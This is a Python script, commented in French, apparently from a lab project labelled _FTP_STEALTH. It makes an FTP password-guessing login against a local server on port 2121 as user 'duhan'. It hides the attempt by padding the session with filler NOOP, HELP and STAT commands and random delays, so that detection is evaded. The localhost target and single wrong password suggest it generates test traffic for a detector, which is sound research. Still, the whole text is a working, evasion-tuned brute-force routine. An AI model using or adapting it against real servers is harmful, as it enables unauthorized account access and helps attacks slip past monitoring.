# Vrai script furtif du projet (_FTP_STEALTH), adapte au port 2121. UNE connexion (1 mauvais mdp).
import ftplib, random, time
TARGET, PORT, USER = "127.0.0.1", 2121, "duhan"
WORDLIST = ["123456"]                   # un seul essai (rate) -> un flux furtif
FILLER = "la session consulte le catalogue et verifie les fichiers du serveur " * 8
rng = random.Random(42)
def pad(ftp, n):
    for _ in range(n):
        if rng.random() < 0.6:
            cmd = "NOOP " + FILLER[:rng.randint(120, 500)]
        else:
            cmd = rng.choice(["HELP", "FEAT", "STAT", "HELP SITE"])
        try:
            ftp.putline(cmd); ftp.getmultiline()
        except Exception: pass
        time.sleep(rng.uniform(0.05, 0.3))
def attempt(pw):
    ftp = ftplib.FTP()
    try:
        ftp.connect(TARGET, PORT, timeout=10)
        pad(ftp, rng.randint(6, 10))
        try:
            ftp.login(USER, pw)
        except ftplib.error_perm:
            pad(ftp, rng.randint(4, 8)); return False
        try: ftp.quit()
        except Exception: pass
        return True
    except Exception: return False
    finally:
        try: ftp.close()
        except Exception: pass
for pw in WORDLIST: attempt(pw)
